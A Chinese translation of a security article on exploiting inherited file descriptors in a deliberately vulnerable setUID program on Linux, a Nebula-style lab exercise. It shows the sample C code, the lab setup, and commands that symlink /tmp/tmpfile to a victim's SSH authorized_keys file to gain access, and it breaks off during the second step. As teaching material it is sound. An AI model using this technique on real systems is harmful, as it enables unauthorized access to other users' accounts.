# setUID程序中的继承文件句柄利用
|
##### 译文声明
本文是翻译文章，文章来源：labs.portcullis.co.uk
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在这篇文章中，我们将研究渗透和安全工作者在setUID程序中发现的许多安全问题之一。对于子进程来说，继承父进程中打开的文件句柄是相当常见的(虽然有避免这种情况的方法)。在某些情况下，这可能会出现安全缺陷。这就是我们将在Linux上的setUID程序的环境中看到的内容。
最近我在处理一个黑客挑战题时想起了这个技术，还有一个比使用我将在这里介绍的技术简单得多的解决方案。大家也许可以尝试两种方法：一种是比较难的方式，另一种是简单的。
## 示例程序
下面是一个非常简短的示例代码测试用例-参考了nebula challenge的代码。
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(int argc, char **argv)
    {
     char *cmd = argv[1];
     char tmpfilepath[] = "/tmp/tmpfile";  // Modern systems need "sysctl fs.protected_symlinks=0" or "chmod 0777 /tmp" for this to be vulnerable to the symlink attack we'll use later.
     char data[] = "pointless datan";
    int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
     unlink(tmpfilepath);
     write(fd, data, strlen(data));
     setuid(getuid());
     system(cmd);
    }
让我们从编译这个代码开始，并设置setUID，完成初始准备：
    root@challenge:/# useradd -m tom # victim/target user
    root@challenge:/# useradd -m bob # attacker
    root@challenge:/# cd ~bob
    root@challenge:/home/bob# cp /share/fd-leak.c .
    root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
    root@challenge:/home/bob# chown tom:tom fd-leak
    root@challenge:/home/bob# chmod 4755 fd-leak
    root@challenge:/home/bob# ls -l fd-leak
    -rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
    root@challenge:/home/bob# su - bob
    bob@challenge:~$ ./fd-leak id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
为了接下来的利用，我们还需要目标用户(在本例中是tom)在主目录中有一个.ssh文件夹：
    root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
这个程序在实际使用方面存在不足但贵在简单。
## 正常操作
从上面的代码可以看出，程序将：
  1. 创建/tmp/tmpfile文件，然后删除它。保留文件描述符。
  2. 取消权限。这段用于取消权限有些糟糕，不过对于这个例子来说足够了。
  3. 运行作为参数提供的命令。它应该作为调用用户运行，而不是作为目标用户(Tom)运行。
让我们试一下(注意，为了在生成shell子进程时使读者更清楚地了解它，我修改了.bashrc)：
    root@challenge:/home/bob# su - bob
    bob@challenge:~$ ./fd-leak id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob@challenge:~$ echo 'echo subshell...' > .bashrc
    bob@challenge:~$ ./fd-leak id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob@challenge:~$ ./fd-leak bash -p
    subshell...
    bob@challenge:~$ id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    root@challenge:/home/bob# useradd -m tom
    root@challenge:/home/bob# su - tom
    $ mkdir .ssh
    $ ls -la
    total 28
    drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
    drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
    ...
所以，fd-leak似乎取消了权限。(我们生成的shell并不对权限负责，我希望通过将-p传递到bash上面并直接运行id能说明这一点)。
最后，我们期望子进程继承/tmp/tmpfile的文件句柄：
    bob@challenge:~$ ls -l /proc/self/fd
    total 0
    lrwx------ 1 bob bob 64 Apr 12 11:22 0 -> /dev/pts/2
    lrwx------ 1 bob bob 64 Apr 12 11:22 1 -> /dev/pts/2
    lrwx------ 1 bob bob 64 Apr 12 11:22 2 -> /dev/pts/2
    lrwx------ 1 bob bob 64 Apr 12 11:22 3 -> '/tmp/tmpfile (deleted)'
    lr-x------ 1 bob bob 64 Apr 12 11:22 4 -> /proc/53982/fd
可以看到，的确是这样的。
## 更高级的方法
我们攻击这个程序的方法将遵循这些高级步骤，这些步骤将在下面几节中更详细地介绍：
  1. 创建一个符号链接（symlink），代码将尝试写入该符号链接。这样，我们可以在我们选择的位置创建一个文件，并使用我们选择的名称。我们将选择~tom/.ssh/authorized_keys
  2. 我们将在子进程的环境中运行一些代码来操作打开的文件句柄，这样就可以编写authorized_keys文件的内容。
  3. 最后通过SSH登录。
## 实际开发
###  步骤1：符号链接（symlink）攻击
简单的:
    ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
这一步在nebula挑战中更加困难，但我不想把问题弄混。
如果我们现在运行代码，我们会看到已创建authorized_keys文件，但我们不控制内容。
    bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
    -rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
    bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
    ln: failed to create symbolic link '/tmp/tmpfile': File exists
    bob@challenge:~$ ls -l /tmp/tmpfile
    lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -> /home/tom/.ssh/authorized_keys
    bob@challenge:~$ ./fd-leak id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
    -rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
我们也不控制创建文件的权限。(在运行“umask 0”以进行检查之后，可以在authorized_keys2上尝试上面的操作)。
###  步骤2：在子进程中运行代码
运行代码很容易。再次说明，这在星云挑战中更加困难。我们可以看到我们希望在/proc/self/fd中列出的文件句柄。文件描述符3：
    bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
    bob@challenge:~$ ls -l /tmp/tmpfile
    lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -> /home/tom/.ssh/authorized_keys
    bob@challenge:~$ ./fd-leak bash
    subshell...